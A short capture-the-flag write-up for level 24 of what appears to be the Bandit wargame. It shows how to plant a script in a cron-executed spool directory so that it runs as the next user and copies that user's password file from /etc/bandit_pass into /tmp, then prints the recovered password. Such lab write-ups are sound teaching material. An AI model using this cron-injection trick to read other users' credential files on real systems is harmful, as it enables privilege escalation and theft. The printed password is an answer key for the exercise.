# Level 24:
Same as before :
```sh
cd /etc/cron.d/
cat /usr/bin/cronjob_bandit24.sh
```
We can now see the following :
```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
```
Let's make our script and inject it into ``/var/spool/bandit24/foo`` since the script is executed as bandit24
```sh
mkdir -p /tmp/bandit23/ && chmod 777 /tmp/bandit23 && cd /tmp/bandit23 #mkdir -p : no error if existing, make parent directories as needed

echo '#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit23/pass' > bandit23.sh

chmod 777 bandit23.sh && cp bandit23.sh /var/spool/bandit24/foo
```
Now we wait for the script to execute, ``ls`` to see if the script did execute, and ``cat`` the content of the pass
#### Password
*`VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`*
